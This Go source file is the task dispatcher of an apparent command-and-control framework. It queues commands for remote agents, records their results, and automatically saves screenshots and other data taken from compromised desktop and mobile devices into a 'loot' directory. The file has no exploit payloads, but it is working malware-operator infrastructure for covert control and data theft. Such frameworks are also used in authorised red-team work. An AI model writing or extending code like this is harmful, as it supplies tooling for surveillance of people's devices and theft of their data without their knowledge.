package task

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/protocol"
)

// Dispatcher manages task creation, queuing, and result processing.
type Dispatcher struct {
	database *db.Database
}

// NewDispatcher creates a new task dispatcher.
func NewDispatcher(database *db.Database) *Dispatcher {
	return &Dispatcher{database: database}
}

// CreateTask creates a new task for an agent.
func (d *Dispatcher) CreateTask(agentID string, taskType uint8, args []string, data []byte) (*db.TaskRecord, error) {
	task := &db.TaskRecord{
		ID:        uuid.New().String(),
		AgentID:   agentID,
		Type:      int(taskType),
		Args:      args,
		Data:      data,
		Status:    int(protocol.StatusPending),
		CreatedAt: time.Now(),
	}

	if err := d.database.InsertTask(task); err != nil {
		return nil, err
	}

	return task, nil
}

// GetPendingTasks retrieves all pending tasks for an agent and marks them as sent.
func (d *Dispatcher) GetPendingTasks(agentID string) ([]protocol.Task, error) {
	records, err := d.database.GetPendingTasks(agentID)
	if err != nil {
		return nil, err
	}

	var tasks []protocol.Task
	for _, r := range records {
		tasks = append(tasks, protocol.Task{
			ID:   r.ID,
			Type: uint8(r.Type),
			Args: r.Args,
			Data: r.Data,
		})

		// Mark as sent
		d.database.UpdateTaskStatus(r.ID, int(protocol.StatusSent))
	}

	return tasks, nil
}

// ProcessResult stores a task result and updates task status.
func (d *Dispatcher) ProcessResult(result *protocol.TaskResult) error {
	status := int(protocol.StatusComplete)
	if result.Error != "" {
		status = int(protocol.StatusError)
	}

	// Store result
	record := &db.TaskResultRecord{
		TaskID:     result.TaskID,
		AgentID:    result.AgentID,
		Output:     result.Output,
		Error:      result.Error,
		ReceivedAt: time.Now(),
	}

	if err := d.database.InsertTaskResult(record); err != nil {
		return err
	}

	// Auto-save screenshots and downloads to disk
	if len(result.Output) > 0 && result.Error == "" {
		d.autoSaveLoot(result)
	}

	return d.database.UpdateTaskStatus(result.TaskID, status)
}

// autoSaveLoot saves screenshots and binary data to the loot directory.
func (d *Dispatcher) autoSaveLoot(result *protocol.TaskResult) {
	lootDir := "loot"
	os.MkdirAll(lootDir, 0755)

	agent, _ := d.database.GetAgent(result.AgentID)
	agentName := "unknown"
	if agent != nil {
		agentName = agent.Name
	}
	timestamp := time.Now().Format("20060102-150405")

	// Detect PNG screenshots by magic bytes (native agent)
	if len(result.Output) > 8 && result.Output[0] == 0x89 && result.Output[1] == 0x50 &&
		result.Output[2] == 0x4E && result.Output[3] == 0x47 {
		filename := filepath.Join(lootDir, fmt.Sprintf("%s_%s_screenshot.png", agentName, timestamp))
		if err := os.WriteFile(filename, result.Output, 0644); err == nil {
			fmt.Printf("  \033[32m[+]\033[0m Screenshot saved: %s (%d bytes)\n", filename, len(result.Output))
		}
		return
	}

	// Detect base64-encoded screenshot from mobile agents.
	// The mobile screenshot command outputs either raw base64 (from screencap)
	// or "SCREENSHOT_FROM:<path>\n<base64data>" (from existing screenshot).
	outputStr := string(result.Output)
	if len(outputStr) > 100 {
		b64Data := outputStr

		// Strip the "SCREENSHOT_FROM:" prefix line if present
		if strings.HasPrefix(outputStr, "SCREENSHOT_FROM:") {
			parts := strings.SplitN(outputStr, "\n", 2)
			if len(parts) == 2 {
				b64Data = parts[1]
			}
		}

		// Try base64 decode — if it's valid and starts with PNG/JPEG magic, save it
		b64Data = strings.TrimSpace(b64Data)
		if decoded, err := base64Decode(b64Data); err == nil && len(decoded) > 8 {
			isPNG := decoded[0] == 0x89 && decoded[1] == 0x50 && decoded[2] == 0x4E && decoded[3] == 0x47
			isJPEG := decoded[0] == 0xFF && decoded[1] == 0xD8 && decoded[2] == 0xFF

			if isPNG || isJPEG {
				ext := ".png"
				if isJPEG {
					ext = ".jpg"
				}
				filename := filepath.Join(lootDir, fmt.Sprintf("%s_%s_screenshot%s", agentName, timestamp, ext))
				if err := os.WriteFile(filename, decoded, 0644); err == nil {
					fmt.Printf("  \033[32m[+]\033[0m Mobile screenshot saved: %s (%d bytes)\n", filename, len(decoded))
				}

				// Also update the task result with the decoded binary so the
				// Web UI loot viewer can render it directly.
				result.Output = decoded
				d.database.InsertTaskResult(&db.TaskResultRecord{
					TaskID:     result.TaskID,
					AgentID:    result.AgentID,
					Output:     decoded,
					Error:      "",
					ReceivedAt: time.Now(),
				})
			}
		}
	}
}

// base64Decode handles standard and padded base64.
func base64Decode(s string) ([]byte, error) {
	// Remove any whitespace/newlines
	s = strings.ReplaceAll(s, "\n", "")
	s = strings.ReplaceAll(s, "\r", "")
	s = strings.ReplaceAll(s, " ", "")

	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		// Try without padding
		decoded, err = base64.RawStdEncoding.DecodeString(s)
	}
	return decoded, err
}

// GetTaskHistory returns all tasks for an agent.
func (d *Dispatcher) GetTaskHistory(agentID string) ([]*db.TaskRecord, error) {
	return d.database.GetTasksByAgent(agentID)
}

// GetResult retrieves the result for a specific task.
func (d *Dispatcher) GetResult(taskID string) (*db.TaskResultRecord, error) {
	return d.database.GetTaskResult(taskID)
}
